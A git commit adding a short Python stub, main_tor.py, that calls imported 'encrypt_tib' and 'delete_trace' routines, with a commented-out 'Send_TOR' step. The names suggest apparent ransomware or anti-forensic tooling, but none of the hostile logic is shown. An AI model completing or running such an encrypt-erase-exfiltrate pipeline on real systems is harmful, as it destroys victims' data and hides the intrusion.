d2cea5e5536e87cc28d32d98d48c16bb3762e2ca
Clement <48801402+Clement17-rouault@users.noreply.github.com>
2022-07-14 18:21:33 +0200

    Create main_tor.py

---
+++ main_tor.py
@@ -0,0 +1,12 @@
+import encrypt_tib
+import delete_trace
+# Dictionary
+
+def main():
+    #print("To do")
+    #if Send_TOR.main():
+    encrypt_tib.main()
+    delete_trace.main()
+    #else:
+        #print("error")
+main()
